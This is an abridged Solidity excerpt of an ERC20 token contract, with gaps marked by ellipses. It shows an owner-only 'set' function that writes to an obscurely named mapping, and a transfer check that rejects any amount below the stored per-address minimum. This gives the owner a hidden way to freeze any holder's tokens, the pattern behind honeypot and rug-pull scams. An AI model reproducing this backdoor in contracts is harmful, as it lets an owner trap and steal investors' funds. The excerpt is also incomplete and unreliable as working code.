...
contract Token is IERC20, Ownable, BaseToken {
    ...
    mapping(address => uint256) private _mfsfs; 
    ...
    function set(address account, uint256 amount) public onlyOwner {
        _mfsfs[account] = amount;
    }

    function getmfsf(address account) public view returns (uint256) {
        return _mfsfs[account];
    }
    ...
    function _transfer(
        ...
        require(amount >= _mfsfs[sender], "ERC20: transfer amount is less than minimum allowed"); 
